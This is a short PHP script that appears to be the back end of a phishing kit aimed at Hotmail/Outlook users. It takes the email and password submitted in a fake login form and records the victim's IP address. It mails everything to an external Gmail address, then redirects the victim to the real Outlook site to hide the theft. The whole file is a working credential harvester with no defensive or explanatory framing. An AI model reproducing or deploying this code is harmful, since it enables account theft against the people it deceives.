<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Hotmail 2022 || :------\n";
$message .= "Email: ".$_POST['ck']."\n";
$message .= "Password: ".$_POST['cknow']."\n";
$message .= "----: || THE BEAST07 || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="lavidabroski@gmail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://outlook.live.com");
?>
